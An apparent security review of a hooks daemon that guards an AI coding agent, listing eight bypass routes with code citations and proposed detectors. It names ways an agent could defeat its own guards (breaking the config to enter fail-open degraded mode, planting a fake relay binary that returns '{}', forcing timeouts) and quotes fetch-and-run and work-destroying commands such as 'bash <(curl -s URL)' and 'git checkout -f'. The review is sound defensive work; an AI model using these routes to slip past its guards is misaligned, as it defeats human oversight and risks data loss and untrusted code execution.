# Security review — check `F-BYPS` (bypass inventory)

**Check**: `F-BYPS` — "for each guard, every route that reaches its protected
outcome without passing it."
**Scope**: full tree, root `74b0989cf254b24c3c713254b2c0b52ad5d7ed96` → HEAD
`5d59f7ff`. FULL-ONLY check, reviewed as a whole tree.
**Reviewer**: `security-reviewer` (opus), read-only.
**Findings**: 8 (4 high confidence, 3 medium-high, 1 medium).

The known Bash-write-vs-`Write`-tool split documented in the generated
`CLAUDE.md` is excluded by the brief and is not re-reported. Every finding below
is a different route.

## Method, and what "I looked and found nothing" would have meant here

I enumerated guards by protected OUTCOME rather than by handler, then asked for
each outcome: which other tool, subprocess, interpreter, relocation verb, git
operation, or daemon failure state reaches it. Three whole classes came back
positive, and they are worth naming before the individual findings because the
remediation is different for each:

1. **Sibling-spelling gaps** — the guard enumerates command spellings and the
   enumeration is short of what git/`gh`/POSIX actually offers (F-BYPS-1,
   F-BYPS-2, F-BYPS-6, F-BYPS-7).
2. **Fail-open states the CALLER can induce** — degraded mode, relay timeout
   (F-BYPS-3, F-BYPS-5). These are the check brief's explicit target and are the
   most severe findings here.
3. **The unenforced "only a human may lift this" claim** (F-BYPS-4). Four
   handlers assert in their deny text that no escape hatch exists. Nothing in
   the tree enforces that assertion.

I was able to run this check fully. No path was unreadable and no tool was
absent. One limit on the evidence: **I did not execute any bypass.** Every
finding is established by reading the matching code and, where a regex was the
whole question, by evaluating that regex against candidate strings in a
throwaway interpreter (F-BYPS-1 only). Nothing was written to the repository
except this report.

---

## F-BYPS-1 — `git checkout -f` and `git switch` reach the `git reset --hard` outcome unguarded

**Citation**: `src/claude_code_hooks_daemon/handlers/pre_tool_use/destructive_git.py:87-165`
— the complete `_DESTRUCTIVE_PATTERN_REASONS` table. The two working-tree
patterns are:

```python
rf"{_GIT_INVOCATION}checkout\s+\.\s*(?:$|;|&&|\|)",              # :98
rf"{_GIT_INVOCATION}checkout\s+.*--\s+\S",                        # :104
rf"{_GIT_INVOCATION}restore\s+(?!--staged\b)(?!-S\b).*\S",        # :112
```

There is no pattern for `checkout -f`/`--force`, and no pattern mentioning
`switch` at all. Confirmed tree-wide: the string `switch` occurs in exactly one
handler, `sensitive_content.py:127`, where it is a branch-NAME surface, not a
destructive-command surface.

**What it concretely allows**: `git checkout -f main` and
`git switch --discard-changes main` (equally `git switch -f main`,
`git checkout -f -B main origin/main`) overwrite every modified tracked file in
the working tree with the target ref's content. That is byte-for-byte the
outcome `R-GIT-RESET-HARD` exists to prevent — uncommitted work destroyed with
no reflog entry and no recovery — and the agent reaches it by typing a different
subcommand. Evaluating the table's regexes against these strings returns no
match, while `git reset --hard` and `git checkout .` match as expected.

Two adjacent spellings are in the same gap and are worth fixing in the same
change: `git reset --keep` / `--merge` (both discard working-tree changes that
conflict with the target) and `git read-tree --reset -u HEAD` (the plumbing form
of the same thing).

**The class**: *a guard that enumerates SUBCOMMANDS to reach an outcome, in a
tool whose subcommand set is open and grows.* A defect belongs here when there
is a documented sibling command producing the same irreversible effect that the
pattern table does not name. The deciding question is about the EFFECT, not the
spelling: if the man page says the command overwrites working-tree files from a
ref, it belongs in the table.

**Why the test suite does not catch it**: `tests/.../test_destructive_git*.py`
and `test_blocking_handler_evasion.py` contain no occurrence of `checkout -f` or
`switch` (grepped; zero hits). The tests are written as one case per pattern
already in the table, so they prove each listed pattern fires — a shape that can
only ever confirm the enumeration, never measure its completeness. A test suite
generated from the implementation's own list cannot report an item missing from
that list.

**Detector hypothesis**: a `scripts/qa/` check that holds a curated list of
`(git subcommand, flag)` pairs whose documented effect is "overwrite working
tree" or "delete a ref without a merge check", and asserts that
`_DESTRUCTIVE_PATTERN_REASONS`, compiled, matches a canonical invocation of each.
The list is the artefact under review; the detector's job is to fail the build
when a pair on it has no matching pattern.

*Likely false positives*: low, and of a benign kind — the detector fires only
when a curated pair is unmatched, so its failure mode is a demand to either add
a pattern or justify removing the pair from the list. The real risk is the
opposite: it is only as complete as its curated list, so it will not discover a
subcommand nobody thought of. It converts an invisible gap into a visible,
reviewable list, which is the most this class admits of.

**Confidence**: **High.** The regexes are the whole question and I evaluated
them directly. What would settle the remaining judgement call — whether
`--keep`/`--merge` should be in scope — is the project's own view on whether
"discards changes that conflict" is the same class as "discards all changes".

---

## F-BYPS-2 — `gh release create --notes` publishes an unscanned body to a public GitHub surface

**Citation**: `src/claude_code_hooks_daemon/handlers/pre_tool_use/sensitive_content.py:249-251`

```python
_GH_BODY_PATTERN: Final[re.Pattern[str]] = re.compile(
    r"(?:^|[\s;&|(])gh\s+(?:issue|pr)\s+(?:comment|create|edit)\b"
)
```

The publishing surface is exactly `gh issue|pr comment|create|edit`. Not covered:
`gh release create --notes`/`--notes-file`, `gh gist create`,
`gh pr review --body`, `gh repo edit --description`. (`gh api` is covered by an
explicit, reasoned exclusion at `:244-247` and is not part of this finding.)

**What it concretely allows**: this repository's own documented release procedure
runs precisely the uncovered command —
`CLAUDE/development/RELEASING.md:868-870` and
`.claude/skills/release/invoke.sh:310-312` both invoke

```
gh release create vX.Y.Z --title "vX.Y.Z - [Title]" --notes-file RELEASES/vX.Y.Z.md --latest
```

A secret-word-list term or a public-pattern match in `--title` is published to a
public GitHub release and never scanned, because the title is never scanned on
any surface. Worse, the two halves compose into a complete route with no gate at
either end: `RELEASES/vX.Y.Z.md` written by a Bash heredoc is not seen by
`sensitive_content`'s `Write`/`Edit` branch (the known, documented split), and if
it is published before it is committed, the commit-time staged-diff scan — the
compensating control the documentation names for exactly this case — never runs
either. Authored unscanned, published unscanned, irretractable. That composition
is the shape `F-BYPS` is defined by: "a bypass is created by the INTERACTION of
files, and both can be unchanged."

**The class**: *an outward-publishing surface not enumerated by the guard that
exists to scan outward-publishing surfaces.* Membership test: does the command
transmit caller-supplied text to a third party from whom it cannot be retracted?
If yes, it belongs on the list, regardless of which `gh` noun it uses. The
handler's own docstring states the principle correctly — "A GitHub comment is
more exposed than a commit message: no history rewrite retracts it" — a release
body satisfies that sentence exactly.

**Why the test suite does not catch it**: the handler's acceptance test at
`sensitive_content.py:1413-1421` uses `gh issue comment --body`. The tests
instantiate the pattern rather than probe its boundary, so they cannot
distinguish "this surface is covered" from "this is the only surface". There is
additionally no test that asks whether `--title` is scanned on any command; the
inline-body scan is only ever exercised through `--body`.

**Detector hypothesis**: a docs+code check that extracts every `gh <noun> <verb>`
invocation appearing in this repository's own tracked documentation, scripts and
skills, and asserts each is either matched by `_GH_BODY_PATTERN` or carries an
explicit recorded exclusion beside it (the shape `gh api` already has at
`:244-247`). Grounding the list in the repo's own usage keeps it honest and
self-updating — a new publishing command cannot be added to the release
procedure without the detector noticing.

*Likely false positives*: moderate and predictable. Read-only invocations
(`gh pr view`, `gh run list`, `gh api` reads) appear throughout the docs and
would each need an exclusion on first sight. Mitigate by seeding the exclusion
list with the read verbs (`view`, `list`, `status`, `checkout`, `download`) —
after which the detector fires only on a genuinely new write verb. I would
report this rule as *initially noisy, then quiet*, which is an acceptable
profile; a rule that is noisy forever is not.

**Confidence**: **High** on the coverage gap (the regex is unambiguous and the
release command is in the repo's own tracked procedure). **Medium** on severity,
which depends on how often a release title or notes file carries anything from
the secret list — a question about content history I deliberately did not
investigate, because doing so would mean reading the protected material this
review exists to keep out of context.

---

## F-BYPS-3 — degraded mode disables every PreToolUse guard except one, and a config edit reaches it

**Citation**: `src/claude_code_hooks_daemon/daemon/controller.py:915-925`

```python
if self._degraded:
    safety_net_result = self._degraded_mode_safety_net(event)
    if safety_net_result is not None:
        return ChainExecutionResult(result=safety_net_result, execution_time_ms=0.0)
    config_error_result = HookResult.configuration_error(self._config_errors)
    return ChainExecutionResult(result=config_error_result, execution_time_ms=0.0)
```

`_degraded_mode_safety_net` (`:794-830`) runs `DestructiveGitHandler` and
nothing else. `HookResult.configuration_error`
(`src/claude_code_hooks_daemon/core/hook_result.py:1155-1194`) returns
`Decision.ALLOW` — its own docstring says "Fail-open: Returns allow decision".
`self._degraded` is set at `:772` (any config VALIDATION error) and at `:786`
(the validator itself crashed, or the file was unreadable).

**What it concretely allows**: one invalid key anywhere in
`.claude/hooks-daemon.yaml` — a mistyped handler option, a wrong type, a stray
tab — puts the daemon in a state where `secret_file_guard`, `sensitive_content`,
`project_containment`, `sed_blocker`, `curl_pipe_shell`,
`artifact_publish_blocker`, `pipe_blocker`, `root_recursion_guard`,
`write_clobber_guard`, `security_antipattern`, `error_hiding_blocker`,
`tdd_enforcement`, `qa_suppression` and every other PreToolUse handler are
inactive, and every tool call is allowed. Plan 00304 already found this once by
canary and closed exactly one handler's worth of it; the remaining surface is
everything else.

The route has two flavours and the difference matters:

- **Accidental**: an ordinary config typo silently retires the entire guard set
  until someone reads the advisory context. The daemon still reports itself as
  running.
- **Reachable by the agent**: nothing in the tree guards writes to
  `.claude/hooks-daemon.yaml` (established by inspection — no handler names it
  as a protected target, and `.claude/hooks/handlers/pre_tool_use/` contains only
  `README.md`, `example_handler.py.example` and `tests`). Meanwhile EVERY deny
  message in the daemon ends with a footer naming the config key to disable
  (`inject_config_key_footer`). The system therefore tells the agent where the
  off-switch is, on every block, and then does not guard it.

This is materially worse than the per-handler off-switch, because a
schema-invalid config disables ~60 handlers in one edit that reads as a typo,
whereas `enabled: false` leaves a diff naming the guard that was switched off.

**The class**: *a degraded/error state whose fail-open blast radius is the whole
guard set rather than the failing component.* Membership test: when subsystem X
fails, is the set of guards skipped larger than the set of guards that depend on
X? Config validation is about handler OPTIONS; a handler that hard-codes its own
patterns (as `destructive_git` does, which is why it was exempted) does not
depend on config at all, and neither do several others.

**Why the test suite does not catch it**: degraded-mode tests
(`tests/unit/test_config_loader.py`, `tests/unit/daemon/test_cli_check.py`,
`tests/unit/test_debug_info.py`) assert that a bad config PRODUCES degraded mode
and that the advisory is rendered. They test the mechanism against its
specification. No test asserts the complement — that a named guard still fires
while degraded — because fail-open IS the specification here (the controller
docstring at `:911-913` says so). A suite can only fail a behaviour the spec
calls wrong, and this spec calls it right.

**Detector hypothesis**: two rules, because the two flavours need different
nets.

(a) A test-shaped Detector: for every handler carrying
`HandlerTag.SAFETY`/`BLOCKING`, assert it is either config-independent and
therefore included in `_degraded_mode_safety_net`, or has a recorded decision
naming why it may be skipped while degraded. This turns the safety net from an
ad-hoc list of one into a reviewed partition.

(b) A `scripts/qa/` check that `.claude/hooks-daemon.yaml` parses and validates
clean in CI, so a schema-invalid config cannot reach a working tree unnoticed.

*Likely false positives*: (a) is initially loud — most handlers DO read config
options, so most will need the "recorded decision" branch on first run, and a
rule that demands sixty justifications gets suppressed. I would narrow it to the
priority ≤16 safety band first (about a dozen handlers) and report it honestly
as scoped rather than complete. (b) is quiet and near-zero-false-positive, but
it only covers the accidental flavour; it does nothing about an agent editing
the config in-session, which needs a guard rather than a Detector.

**Confidence**: **High** that degraded mode allows everything but
`destructive_git` — the code path is short and unambiguous. **High** that no
handler guards the config file. **Medium** on how easily the state is reached
accidentally in practice, which is a field-frequency question I cannot answer
from the tree.

---

## F-BYPS-4 — "there is NO escape hatch" is asserted by four guards and enforced by none

**Citations** — the claim, in four handlers' deny text:

- `secret_file_guard.py:62-64` — "Only a human may lift this, by editing
  `handlers.pre_tool_use.secret_file_guard` in `.claude/hooks-daemon.yaml`. Ask
  the user; do not hunt for another way to read the file."
- `flaggable_content_channel_guard.py:63`
- `quarantine_artefact_read_guard.py:75`
- `artifact_publish_blocker` — same Plan 00259 doctrine, cited in
  `secret_file_guard.py:21-23`.

**What it concretely allows**: the agent these messages address can perform the
act they reserve to a human. `Write`/`Edit` on `.claude/hooks-daemon.yaml` is
denied by nothing; `bin/hooks-daemon restart` is denied by nothing (the
`daemon_restart_verifier` advisory actively encourages restarts). Two tool calls
retire any named guard. The deny footer supplies the exact key. The severe form
of this is F-BYPS-3(b) — an invalid config retires them all at once — but even
the polite form defeats the specific doctrine these four handlers are built on,
which is that an agent able to type its own justification has self-authorised
disclosure. Editing the config IS typing your own justification, with fewer
words.

I want to be precise about what this finding is and is not. It is not a claim
that the daemon should be an agent sandbox — `secret_file_guard`'s own docstring
is admirably honest that it is "DEFENCE IN DEPTH over an OS boundary the project
must set independently", and I agree with that framing. The finding is narrower
and, I think, harder to argue with: **the deny text states a stronger guarantee
than the implementation provides**, and it states it to the one reader whose
behaviour the guarantee is supposed to govern. An agent that believes "only a
human may lift this" will not try. An agent that tests it will find the claim
false, and every other claim in these messages loses its authority at the same
moment. The cost here is to the credibility of the guard's own text, which for a
guardrail is most of what it has.

**The class**: *a guard whose user-facing text asserts an enforcement property
the tree does not implement.* Membership test: take the strongest factual claim
in the deny message ("never", "only a human", "no route", "cannot") and ask what
in the tree would fail if it were false. If the answer is "nothing", it belongs
here. Note this class is about DOC-vs-CODE drift, so it is detectable by reading
the messages — which is what makes it tractable.

**Why the test suite does not catch it**: the tests assert the deny fires and
that its message matches expected patterns — `secret_file_guard.py:490` and its
acceptance tests assert `r"NO escape hatch"` appears in the output. So the suite
positively verifies that the claim is PRINTED, and has no mechanism for asking
whether it is TRUE. This is the sharpest instance of the general shape in this
report: a message-pattern assertion converts a factual claim into a string
comparison, and a false claim passes it exactly as well as a true one.

**Detector hypothesis**: a `scripts/qa/` check over every handler's
`get_claude_md()` and `Rule.verbose` text for absolute-enforcement phrasing
("NO escape hatch", "only a human", "never ... by any route", "cannot be
disabled"), requiring each occurrence to be accompanied by a machine-checkable
reference — a named test or guard that would fail if the claim were violated.
Unreferenced occurrences fail the check.

*Likely false positives*: **high, and I am reporting this rule as noisy.**
Absolute phrasing is the house style in this codebase's teaching text and much of
it is legitimately about POLICY rather than mechanism ("an unblocked evasion is
NOT permission" is a rule, not an enforcement claim, and would fire). The
distinction between a policy statement and an enforcement claim is a judgement a
regex cannot make. I would expect this rule to need a per-occurrence
acknowledgement file and to be worth it only if the project decides the
doc-vs-code drift is a recurring problem rather than a one-off. Reported as-is
rather than dressed up as clean.

**Confidence**: **High** on the facts (no guard on the config file; the claims
are present verbatim). **Medium** on whether the project considers this a defect
at all, versus an accepted consequence of a guardrail threat model — that is a
call for the register's owner, not for me. What would settle it: a written
threat-model statement saying whether the agent is assumed non-adversarial. I
did not find one; `CLAUDE/Security/README.md` explicitly says it is "not a threat
model".

---

## F-BYPS-5 — the relay fails open on timeout, on an event whose cost the caller controls

**Citation**: `relay/hooks_relay.rs:150-171`

```rust
/// Mid-exchange failure: stdin (partially) consumed, so exec'ing the fallback
/// would replay a truncated payload — forbidden. Fail OPEN instead: `{}` on
/// stdout, exit 0, so Claude Code always receives valid JSON.
fn mid_exchange_fail(args: &Args, class: FailClass, detail: &str) -> ! {
```

Reached with `FailClass::Timeout` after the budget set by the generated
forwarder: `.claude/hooks/pre-tool-use:26-27` passes `--timeout-ms 30000`. The
outer `.claude/settings.json` hook timeout is 60s. Both boundaries fail open.

**What it concretely allows**: any tool call the daemon takes longer than 30
seconds to judge is ALLOWED, with a single stderr line as the only trace — no
deny, no context, no entry the agent or a reviewer sees in-band. The reason this
is a bypass rather than a benign robustness measure is that the daemon's work on
a PreToolUse event is a function of input the CALLER chooses:

- `sensitive_content` scans staged content on `git commit` via chunked
  `git diff` subprocesses up to `MAX_STAGED_TOTAL_BYTES` = 4 MiB
  (`sensitive_content.py:215-216`), across as many chunks as the pathspec budget
  requires (`_MAX_PATHSPEC_ARGV_BYTES`, `:238`). A commit staging thousands of
  files is the documented motivation for that chunking.
- `validate_eslint_on_write` shells out to ESLint (priority 10).
- `plan_qa_commit_gate` / `docs_qa_commit_gate` run tree-wide QA at commit time.
- `secret_file_guard` performs a bounded directory walk on a directory-rooted
  `Grep`.

So "make the guard slow, and the guard is skipped" is available on the same
commit the guard exists to scan. The size BOUNDS inside `sensitive_content` are
carefully chosen and well documented — the handler stands itself down loudly,
with a log line, rather than scanning partially. That care is undercut by an
outer timeout that stands the whole daemon down quietly.

**The class**: *a timeout fail-open on a decision whose computation cost is
controlled by the party the decision constrains.* Membership test: can the caller
increase the work the guard must do, without the guard getting a proportional
increase in budget or a deny-on-exhaustion? A fixed timeout over
caller-scaled work is always in this class. Contrast the in-handler bound, which
is NOT in the class: it detects its own exhaustion and records it.

**Why the test suite does not catch it**: `relay/test_relay.py:159` is literally
`test_timeout_fail_open` — the behaviour is asserted as correct, with a test
harness (`:49`) that deliberately forces the read timeout. The test suite cannot
catch this because it encodes it. The unasked question is not "does it fail
open?" but "can the caller cause the condition?", and no test in the tree asks
that about any guard.

**Detector hypothesis**: an inventory-shaped rule rather than a code pattern.
For each fail-open boundary in the enforcement path (relay timeout, the outer
hook timeout, degraded mode, the non-strict per-handler `except` at
`core/chain.py:470-495`), require a recorded entry naming (i) what induces it,
(ii) whether the inducing input is caller-controlled, and (iii) what trace it
leaves in-band. The Detector fails when a `timeout`/`except`/fail-open path
exists in the enforcement path with no entry. The valuable column is (iii):
several of these currently leave only a stderr line.

*Likely false positives*: moderate — `except` clauses abound in a Python
codebase and most are not enforcement-path fail-opens. Scope it to the dispatch
path (`core/chain.py`, `core/front_controller.py`, `daemon/controller.py`,
`relay/`, `.claude/init.sh`) rather than the whole tree, and it becomes a small
reviewable list rather than a stream. I would expect roughly six entries, which
is the right size for a document a human maintains.

**Confidence**: **High** that the fail-open exists and is deliberate (the source
comment and the test name both say so). **Medium** that 30s is actually
reachable by a plausible commit on real hardware — I did not measure it, and
measuring it would mean constructing the large commit, which is outside a
read-only review. That measurement is what would settle it, and it is the single
most valuable follow-up in this report: if a 5,000-file commit judges in 2
seconds the finding is theoretical, and if it judges in 40 the finding is live.

---

## F-BYPS-6 — `bash <(curl URL)` and `eval "$(curl URL)"` reach the `curl | bash` outcome

**Citation**: `src/claude_code_hooks_daemon/handlers/pre_tool_use/curl_pipe_shell.py:81-111`

```python
_CURL_PIPE_SHELL_PATTERN = (
    r"\b(curl|wget)\b.*\|\s*" + OPTIONAL_SUDO + OPTIONAL_PATH + ...
)
_PIPE_INTO_INTERPRETER_PATTERN = (
    r"\|\s*" + OPTIONAL_SUDO + OPTIONAL_PATH + ...
)
```

Both alternatives require a literal `|`. The string `substitution` does not occur
anywhere in the file.

**What it concretely allows**: `bash <(curl -s https://example.com/install.sh)`
and `eval "$(curl -s https://example.com/install.sh)"` and
`source <(curl -s URL)` and `python3 -c "$(curl -s URL)"` each execute untrusted
remote code with no inspection step — the handler's own stated harm, verbatim:
"Execute untrusted remote code without inspection / Provide no opportunity to
verify what will be executed". None contains a pipe, so none matches. These are
not obscure: process substitution and command substitution are the two standard
ways to spell `curl | bash` when the interpreter wants a file argument or the
payload is an expression.

This one is close to F-BYPS-1 in shape but differs in an important way, which is
why it is listed separately: the handler has been hardened twice already against
RESPELLINGS of the same construct (`OPTIONAL_PATH` for `| /bin/bash`,
`OPTIONAL_SUDO` for `| sudo bash`, the heredoc-body scan at `:102-111` for
`(cat <<'X' … X) | bash`). Each of those fixes generalised the text AROUND the
pipe while leaving the pipe itself load-bearing. The remaining gap is the one
assumption nobody revisited.

**The class**: *a guard anchored on one shell operator, where the shell provides
other operators with the same data-flow.* Membership test: does an alternative
shell construct route the same producer's output into the same consumer? `|`,
`<(...)`, `$(...)`, `` `...` ``, `< <(...)` and a temp file all do. A guard
naming one of them and not the others is in this class.

**Why the test suite does not catch it**: the handler's acceptance tests
(`curl_pipe_shell.py:311-340`) are `curl ... | bash` and `wget -O- ... | sh` —
both pipe forms, wrapped in `echo`. The unit tests follow the same shape. The
suite grew by accretion alongside the fixes: each hardening added a test for the
respelling it fixed, so the suite is a record of gaps already closed and is
structurally incapable of naming one still open. Notably, the handler's own
`get_claude_md()` (`:274-305`) is otherwise scrupulous about documenting limits —
it explicitly warns that `eval "$(cat <<'EOF')"` runs the body locally — so the
mechanism was understood in the heredoc context and simply not carried across to
the network-fetch context.

**Detector hypothesis**: for each handler whose pattern contains a literal
shell-operator character, require a test case for the same producer/consumer pair
expressed via every other operator in a fixed set (`|`, `<(…)`, `$(…)`,
backticks, write-then-execute). Implemented as a QA check over the handler's
declared acceptance tests, not over prose.

*Likely false positives*: low-to-moderate. Some operator substitutions are
genuinely inapplicable (a producer that only writes to stdout cannot be used via
`<(…)` in every consumer position), so the rule will demand a few "not
applicable" acknowledgements. That is a short, one-time cost, and unlike the
F-BYPS-4 rule the judgement is mechanical rather than semantic. I would expect
this one to settle quiet.

**Confidence**: **High.** The patterns require `|` by construction and the
alternatives contain none; no execution needed to establish it. I did not test
whether `write-then-execute` (`curl -o f URL && bash f`) should also be in
scope — the handler's `get_claude_md()` RECOMMENDS that form as the safe
alternative (download, inspect, execute), so it is a deliberate allow and is
correctly excluded. Only the no-inspection-step forms above are the finding.

---

## F-BYPS-7 — `worktree_file_copy` names three relocation verbs; the project's own vocabulary names six

**Citation**: `src/claude_code_hooks_daemon/handlers/pre_tool_use/worktree_file_copy.py:104`

```python
if not re.search(r"\b(cp|mv|rsync)\b", command, re.IGNORECASE):
```

Compare `src/claude_code_hooks_daemon/core/utils.py:94`, the shared accessor's own
list of commands that put bytes at a destination:

```python
_WRITE_INDICATOR_RE = re.compile(r">|of=|\b(?:tee|cp|mv|install|dd)\b")
```

**What it concretely allows**: `install -m644 untracked/worktrees/feature/src/x.py src/x.py`,
`dd if=untracked/worktrees/feature/src/x.py of=src/x.py`,
`cat untracked/worktrees/feature/src/x.py > src/x.py`,
`tar -C untracked/worktrees/feature -cf - src | tar -C . -xf -`, and
`scp`/`ln` between the two trees all defeat worktree isolation exactly as
`cp` does — the `R-WORKTREE-FILE-COPY` outcome ("bypasses git tracking, and can
nuke untracked work in the target directory") reached by a verb the guard does
not name. The redirect form is the most likely to be typed innocently.

What makes this a clean finding rather than a general "the list is short"
complaint is that the completeness question is already ANSWERED elsewhere in
this tree. `core/utils.py` reasons carefully about which verbs relocate bytes
versus author them, and separates them with a dedicated `authored` flag
(`_TargetCandidate`, `utils.py:97-122`) precisely so that location guards and
content guards can take different subsets. `worktree_file_copy` is a location
guard and is the natural consumer of the location-guard subset, but it
re-derives a shorter list with its own regex instead.

**The class**: *a guard that re-derives a command vocabulary the tree already
maintains canonically, and derives it shorter.* Membership test: does a shared
utility in this repo enumerate the same category of command more completely than
the handler does? This is narrower than "incomplete list" and much easier to
adjudicate — the canonical list is the reference, and divergence is the defect.

**Why the test suite does not catch it**: the handler's acceptance tests
(`worktree_file_copy.py:187-190` and siblings) cover `cp`, `mv` and `rsync` —
one per verb in its own regex. The suite is generated from the implementation's
list, so it measures the list against itself. No test compares the handler's
vocabulary with `_WRITE_INDICATOR_RE`, because nothing in the tree asserts that
the two should agree.

**Detector hypothesis**: a `scripts/qa/` check that extracts command-name
alternations from handler source (the `\b(a|b|c)\b` shape) and, for any handler
tagged as a location/path guard, asserts its alternation is a superset of the
relocation verbs in `core/utils.py`. Divergence fails with both lists printed.

*Likely false positives*: low. The rule compares two lists in the same
repository and fires only on a subset relation, so it has no opinion about
commands neither list mentions. The main maintenance cost is keeping the
"location guard" tag accurate, which the `HandlerTag` system already supports.
This is the cleanest of the seven Detectors proposed here and I would build it
first.

**Confidence**: **High** on the gap. **Medium** on priority — worktree isolation
is a workflow-integrity guard rather than a confidentiality or destruction
guard, so the consequence of a bypass is a confusing merge rather than data loss
or disclosure. I rank it last of the seven deliberately.

---

## F-BYPS-8 — the relay hot path `exec`s an unverified binary from a gitignored directory

**Citation**: `.claude/hooks/pre-tool-use:18-29` (identical generated block in
every forwarder, e.g. `.claude/hooks/setup:18-29`):

```bash
_rl_bin="${HOOKS_DAEMON_RELAY_BINARY:-/workspace/untracked/bin/hooks-relay}"
_rl_sock="$_rl_events_dir/pre-tool-use.sock"
if [[ -x "$_rl_bin" && -S "$_rl_sock" ]]; then
    exec "$_rl_bin" "$_rl_sock" --fallback "${BASH_SOURCE[0]}" --timeout-ms "30000"
fi
```

The path is generated by
`src/claude_code_hooks_daemon/install/forwarder_generator.py:164-166,243,263`.
`untracked/` is gitignored (`.gitignore:200`), and `relay/build.sh:19` places
build output there by design — "the output lands under `untracked/` and is NEVER
committed: the repo's auditable surface stays 100%".

**What it concretely allows**: the entire PreToolUse enforcement path is
delegated, before the daemon is consulted, to an executable in a directory that
is (a) writable by the agent, (b) excluded from git, and (c) checked only for
the `-x` bit — no checksum, no signature, no ownership or mode test. Two files
under `untracked/` — an executable that prints `{}` and a listening socket —
constitute a complete replacement PreToolUse handler that allows everything.
This is the only route in this report that also defeats the degraded-mode
destructive-git safety net, because it never reaches the daemon at all. Neither
file is blocked by anything: `project_containment` permits writes inside the
repo, `untracked/scratch/` is the *recommended* scratch location, and
`chmod +x` is outside `dangerous_permissions`' 777/`a+w`/`o+w` scope.

The design note quoted above is the finding stated from the other side. Keeping
the binary out of git does keep the *reviewable* surface at 100% — and it moves
the *executing* surface outside review entirely. Both halves of that trade are
true; only one is written down.

Severity depends on deployment: `untracked/bin/` does not exist in this
container, so the hot path is currently inert here and the forwarder falls
through to `init.sh`. The finding is about the shape of the deployed
configuration, not about a live compromise in this checkout.

**The class**: *the enforcement path depending on an artefact stored outside the
integrity domain it enforces.* Membership test: if this file were replaced, would
a guard stop firing — and does anything detect the replacement? An artefact that
is both (i) on the enforcement path and (ii) gitignored and unverified is in the
class.

**Why the test suite does not catch it**: `relay/test_relay.py` builds the real
binary and exercises its protocol. It asks whether the relay behaves correctly,
which presupposes that the relay running is the relay that was built. No test
can observe substitution, because substitution happens between build and
invocation, and nothing in the invocation path records which bytes it ran.
`deployed_artefact_drift` — the existing advisory for deployed-file drift —
compares deployed files against their TEMPLATES in the repo, and the relay
binary has no tracked template to compare against, by the same design decision.

**Detector hypothesis**: have the build record the binary's digest into a
TRACKED manifest, and have the forwarder verify it before `exec` (or, if the
per-call cost is unacceptable, have a session-start handler verify it once and
deny/advise on mismatch). The Detector proper is a `scripts/qa/` check asserting
that every path the forwarders `exec` is covered by such a manifest entry.

*Likely false positives*: low for the QA check itself — it enumerates a handful
of generated forwarders and their `exec` targets. The cost is not false
positives but genuine friction: a developer rebuilding the relay locally now has
to refresh the manifest, and a stale manifest after an ordinary rebuild would
deny every hook, which is the worst possible failure mode for this particular
guard. I would report the verification as **higher risk than the finding** unless
it is implemented advisory-first, and I would recommend the session-start
variant over the per-call one for exactly that reason.

**Confidence**: **Medium-high.** The code path and the permissions are certain —
I read the generated forwarder and the gitignore. What I did not do, and would
not do, is create the socket and the executable to prove the substitution works
end to end; that is building the bypass rather than reporting it. Reading
`relay/hooks_relay.rs`'s protocol confirms a replacement need only write `{}` and
exit 0, which is what the timeout path already does at `:165-170`.

---

## Two things I checked that are NOT findings

Recorded because a clean result on a plausible route is worth as much to the
next reviewer as a finding, and because "not reported" is otherwise
indistinguishable from "not looked at".

- **Handler crash blast radius.** `core/front_controller.py:78-160` wraps the
  whole handler loop in a single `try` outside the `for`, so one crash would
  abandon every later guard. That would be a serious finding — but
  `FrontController` is **not on the live path**: no instantiation exists outside
  tests. The live dispatcher is `core/chain.py:407-495`, whose `try` is INSIDE
  the loop and which logs-and-continues per handler in non-strict mode. Blast
  radius is one handler, not the chain. Correctly built.
  (The non-strict per-handler fail-open itself is a fail-open boundary and is
  folded into F-BYPS-5's Detector inventory rather than reported separately.)
- **Mode interceptor short-circuit.** `daemon/controller.py:936-949` runs a mode
  interceptor BEFORE the handler chain, and the `mode` skill lets an agent
  change modes — which looked like a one-command route past every guard.
  `core/mode_interceptor.py:56-83` returns `None` for every event except
  `EventType.STOP`. PreToolUse is never intercepted. Not a bypass.

Two further notes, neither a `F-BYPS` finding:

- `dispatch_declaration` and `agent_isolation_advisor` both correctly match
  `SUBAGENT_DISPATCH_TOOL_NAMES` rather than the `Task` literal, so the
  documented `Task`/`Agent` dual-name hazard (`constants/tools.py:60-63`) has no
  instance in the tree. Checked because it is precisely the shape this check
  hunts.
- `pipe_blocker` misparsed a `grep` whose PATTERN contained `<(`, reporting the
  producer as `"` and denying a read-only command
  (`R-PIPE-TO-HEAD: Pipe to tail/head — " unrecognized`). That is a false
  POSITIVE, the opposite of a bypass, so it is out of scope for `F-BYPS` — noted
  here only so the observation is not lost.

## Suggested triage order

By blast radius, not by confidence: **F-BYPS-3** (one edit, all guards) and
**F-BYPS-8** (defeats even the degraded-mode safety net) first; then
**F-BYPS-5** (needs the measurement named above to size it); then **F-BYPS-1**
and **F-BYPS-6**, which are small, self-contained pattern additions with
existing test harnesses to extend; then **F-BYPS-2**; then **F-BYPS-7**.
**F-BYPS-4** is a policy decision for the register's owner before it is a code
change.

Per `CLAUDE/Security/README.md`, none of these is recorded in the register by
me: a category is written by the caller once its class is confirmed and its
Defence exists, because a category with no Defence is a claim the register
cannot make honestly.
